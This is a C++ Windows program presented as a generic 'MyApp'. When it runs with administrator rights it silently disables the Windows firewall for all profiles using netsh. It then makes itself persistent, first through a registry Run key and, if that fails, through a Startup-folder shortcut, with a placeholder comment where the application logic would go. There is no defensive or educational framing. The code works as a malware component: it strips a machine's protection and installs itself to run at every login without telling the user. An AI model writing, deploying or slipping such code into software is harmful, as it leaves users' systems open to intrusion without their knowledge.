#include <iostream>
#include <string>
#include <Windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <fstream>

bool is_elevated() {
    bool elevated = false;
    HANDLE token = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            elevated = elevation.TokenIsElevated;
        }
    }

    if (token) {
        CloseHandle(token);
    }
    return elevated;
}

void disable_firewall() {
    system("netsh advfirewall set allprofiles state off");
}

bool add_to_startup(const std::wstring& app_path) {
    HKEY hkey = NULL;
    LONG create_status = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hkey, NULL);

    if (create_status == ERROR_SUCCESS) {
        wchar_t path[MAX_PATH];
        wcscpy_s(path, app_path.c_str());
        LONG set_status = RegSetValueExW(hkey, L"MyApp", 0, REG_SZ, (BYTE*)path, (app_path.size() + 1) * sizeof(wchar_t));

        if (set_status == ERROR_SUCCESS) {
            RegCloseKey(hkey);
            return true;
        }

        RegCloseKey(hkey);
    }

    return false;
}

bool create_shortcut(const std::wstring& app_path) {
    wchar_t startup_path[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startup_path) == S_OK) {
        std::wstring shortcut_path = std::wstring(startup_path) + L"\\MyApp.lnk";
        HRESULT hres;
        IShellLink* psl;

        CoInitialize(NULL);
        hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);

        if (SUCCEEDED(hres)) {
            IPersistFile* ppf;

            psl->SetPath(app_path.c_str());
            psl->SetDescription(L"MyApp");

            hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);

            if (SUCCEEDED(hres)) {
                hres = ppf->Save(shortcut_path.c_str(), TRUE);
                ppf->Release();
                return SUCCEEDED(hres);
            }
            psl->Release();
        }
        CoUninitialize();
    }

    return false;
}

int main() {
    wchar_t app_path[MAX_PATH];
    GetModuleFileNameW(NULL, app_path, MAX_PATH);

    if (is_elevated()) {
        disable_firewall();
    }

    bool startup_set = add_to_startup(app_path);

    if (!startup_set) {
        create_shortcut(app_path);
    }
    // Your application logic here
    std::cout << "MyApp is running..." << std::endl;

    // Keep the console window open
    std::cin.get();

    return 0;
}
